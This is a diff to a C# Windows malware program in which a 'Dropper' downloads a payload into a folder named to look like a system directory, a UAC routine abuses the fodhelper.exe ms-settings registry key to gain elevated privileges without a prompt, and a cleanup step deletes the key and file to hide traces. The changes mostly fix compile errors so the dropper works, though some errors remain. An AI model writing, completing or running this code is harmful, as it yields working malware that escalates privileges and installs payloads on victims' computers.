@@ -2,7 +2,7 @@ using System;
 using System.Net;
 using Microsoft.Win32;
 using System.Diagnostics;
-using Sytsem.IO;
+using System.IO;
 
 namespace Main {
     public class Program {
@@ -10,8 +10,8 @@ namespace Main {
             string url = ""; //Add download site here
             string savePath = @"C:\WindowsSettingsManager";
             WebClient client = new WebClient();
-            client.DownloadFile(url, savePAth)
-            delete WebClient;
+            client.DownloadFile(url, savePath);
+            client.Dispose()
         }
 
         public static bool UAC()
@@ -32,23 +32,23 @@ namespace Main {
             }
         }
 
-        public static void Cleanup(string path) {
+        public static bool Cleanup(string path) {
             try
             {
                 Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command", false);
-                File.delete(path);
+                File.Delete(path);
+                return true;
             }
             catch (Exception ex)
             {
-                System.Environment.Exit(1);
-                System.Windows.Forms.Application.Exit();
+                return false;
             }
 
         }
 
         public static void Main() {
-            Dropper()
-            bool status = UAC()
+            Dropper();
+            bool status = UAC();
             if (!status) {
                 string path = Directory.GetCurrentDirectory() + @"\delivery.exe";
                 File.delete(path);
@@ -58,13 +58,13 @@ namespace Main {
             {
                 Arguments = "",
                 FileName = "fodhelper.exe",
-                UseShellExcecute = false;
+                UseShellExecute = false;
                 RedirectStandardOutput = false,
                 CreateNoWindow = true
 
             });
 
-            proc.Start()
+            status = Cleanup()
         }
 
     }
